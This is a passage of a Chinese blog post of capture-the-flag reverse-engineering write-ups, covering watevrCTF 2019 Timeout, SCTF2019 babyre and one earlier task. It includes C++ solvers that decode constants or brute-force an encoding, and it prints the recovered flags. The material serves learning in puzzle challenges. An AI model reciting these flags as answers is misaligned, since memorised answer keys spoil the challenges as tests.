class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans[<span class="number">10</span>] = &#123;<span class="number">0xbc8ff26d43536296</span>, <span class="number">0x520100780530ee16</span>, <span class="number">0x4dc0b5ea935f08ec</span>, <span class="number">0x342b90afd853f450</span>, <span class="number">0x8b250ebcaa2c3681</span>, <span class="number">0x55759f81a2c68ae4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ans[i] &amp;amp; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans[i] = (ans[i] ^ <span class="number">0xB0004B7679FA26B3</span>) / <span class="number">2</span>;</span><br><span class="line">                ans[i] |= <span class="number">0x8000000000000000</span>;                   <span class="comment">//强制给它置为负数</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ans[i] /= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ans[i] &amp;amp; <span class="number">0xff</span>);</span><br><span class="line">            ans[i] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到flag：6ff29390-6c20-4c56-ba70-a95758e3d1f8</p><h2 id="watevrCTF-2019-Timeout"><a href="#watevrCTF-2019-Timeout" class="headerlink" title="[watevrCTF 2019]Timeout"></a>[watevrCTF 2019]Timeout</h2><p>通过010 editor或者exeinfoPE可以知道这家伙是一个elf文件。把.com后缀删掉拖到IDA里，然后翻一翻各种函数，可以找到flag。<br>得到flag：3ncrytion_is_overrated_youtube.com&#x2F;watch?v&#x3D;OPf0YbXqDm0</p><h2 id="SCTF2019-babyre"><a href="#SCTF2019-babyre" class="headerlink" title="[SCTF2019]babyre"></a>[SCTF2019]babyre</h2><p>非常傻逼的题目。<br>首先干掉4个花指令。<br>然后处理三组加密。第一个走迷宫，第二个硬爆破，第三个嗯逆。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//爆破</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> str[<span class="number">700</span>] = &#123;</span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">62</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">63</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">56</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">57</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">58</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">59</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">61</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">64</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">11</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">14</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">17</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">19</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">20</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">21</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">22</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">23</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">25</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">26</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">36</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">38</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">39</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">40</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">41</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">42</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">43</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">44</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">45</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">46</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">47</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">49</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">50</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> i, j, k, p, q, r;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">5</span>] = &#123;<span class="number">0x736374</span>, <span class="number">0x665f39</span>, <span class="number">0x313032</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">126</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">32</span>; k &lt; <span class="number">126</span>; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(p = <span class="number">32</span>; p &lt; <span class="number">126</span>; p++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span>(q = <span class="number">32</span>; q &lt; <span class="number">126</span>; q++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>((((((str[j * <span class="number">4</span>] &amp;amp; <span class="number">0x3f</span>) &lt;&lt; <span class="number">6</span>) | (str[k * <span class="number">4</span>] &amp;amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="number">6</span> | (str[p * <span class="number">4</span>] &amp;amp; <span class="number">0x3f</span>)) &lt;&lt; <span class="number">6</span> | (str[q * <span class="number">4</span>] &amp;amp; <span class="number">0x3f</span>)) == ans[i])</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span>(str[j * <span class="number">4</span>] != <span class="number">64</span> &amp;amp;&amp;amp; str[k * <span class="number">4</span>] != <span class="number">64</span> &amp;amp;&amp;amp; str[p * <span class="number">4</span>] != <span class="number">64</span> &amp;amp;&amp;amp; str[q * <span class="number">4</span>] != <span class="number">64</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>, j, k, p, q);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//嗯逆</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __ROL4__(<span class="type">unsigned</span> <span class="type">int</span> x, <span class="type">int</span> k)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; k) | (x &gt;&gt; (<span class="number">32</span> - k));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __ROR4__(<span class="type">unsigned</span> <span class="type">int</span> x, <span class="type">int</span> k)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; k) | (x &lt;&lt; (<span class="number">32</span> - k));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> data[<span class="number">2000</span>] = &#123;</span><br><span class="line">    <span class="number">214</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">144</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">233</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">254</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">204</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">225</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">61</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">183</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">22</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">182</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">20</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">194</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">40</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">251</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">44</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">43</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">103</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">154</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">42</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">190</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>, <span class="number">195</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">170</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">     <span class="number">68</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">19</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">38</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">134</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">153</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">156</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">244</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">145</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">239</span>,   <span class="number">0</span>, </span><br><span class="line">      <span class="number">0</span>,   